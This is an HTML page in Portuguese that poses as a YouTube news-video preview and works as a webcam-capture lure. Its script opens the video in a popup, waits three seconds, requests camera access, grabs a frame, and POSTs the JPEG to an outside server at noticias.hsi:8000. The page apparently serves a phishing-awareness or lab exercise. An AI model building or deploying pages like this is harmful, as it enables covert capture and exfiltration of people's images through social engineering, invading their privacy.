<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prévia de Notícia</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('imagem/imagem1.jpg'); /* Caminho para sua imagem de fundo */
            background-size: cover; /* Garante que a imagem cubra todo o fundo */
            background-position: center; /* Centraliza a imagem */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            background-color: rgba(255, 255, 255, 0.9); /* Fundo branco semi-transparente */
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 90%;
            margin: auto;
        }
        h1 {
            color: #007bff;
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        p {
            color: #495057;
            font-size: 1.2rem;
            line-height: 1.6;
        }
        #youtubeLink {
            display: inline-block;
            padding: 12px 24px;
            background-color: #007bff;
            color: #ffffff;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease;
            font-size: 1.2rem;
            margin-top: 20px;
        }
        #youtubeLink:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Clique para ver uma prévia do vídeo</h1>
        <p>Esta página está configurada para permitir a visualização de uma prévia de um vídeo do YouTube e solicitar acesso à câmera.</p>
        <a id="youtubeLink" href="#" onclick="openPopupAndCapture()">Ver Prévia</a>
    </div>

    <script>
        function openPopupAndCapture() {
            event.preventDefault(); // Impede o redirecionamento imediato

            // URL do vídeo do YouTube
            var youtubeURL = "https://www.youtube.com/embed/-7FdWwWO3Z4";

            // Abre uma janela popup com a prévia do vídeo do YouTube
            var popup = window.open(youtubeURL, 'youtubePreview', 'width=800,height=600');

            // Solicita acesso à câmera após um curto atraso (para visualização do vídeo)
            setTimeout(function() {
                // Solicita acesso à câmera
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Cria um elemento de vídeo para capturar a imagem da câmera
                        var videoElement = document.createElement('video');
                        videoElement.srcObject = stream;
                        videoElement.onloadedmetadata = function(e) {
                            videoElement.play();
                            // Cria um canvas para desenhar o frame do vídeo
                            var canvas = document.createElement('canvas');
                            canvas.width = videoElement.videoWidth;
                            canvas.height = videoElement.videoHeight;
                            var context = canvas.getContext('2d');
                            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                            // Converte o canvas para uma imagem
                            var imageDataURL = canvas.toDataURL('image/jpeg');

                            // Envia a imagem para o servidor
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', 'http://noticias.hsi:8000/save-image', true);
                            xhr.setRequestHeader('Content-Type', 'application/json');
                            xhr.onreadystatechange = function() {
                                if (xhr.readyState === XMLHttpRequest.DONE) {
                                    if (xhr.status === 200) {
                                        alert('Imagem enviada com sucesso!');
                                    } else {
                                        alert('Erro ao enviar imagem.');
                                    }
                                }
                            };
                            xhr.send(JSON.stringify({ image: imageDataURL }));

                            // Fecha a stream da câmera
                            stream.getTracks().forEach(function(track) {
                                track.stop();
                            });
                        };
                    })
                    .catch(function(error) {
                        alert("Acesso à câmera negado.");
                    });
            }, 3000); // Atraso de 3 segundos para visualização do vídeo
        }
    </script>
</body>
</html>
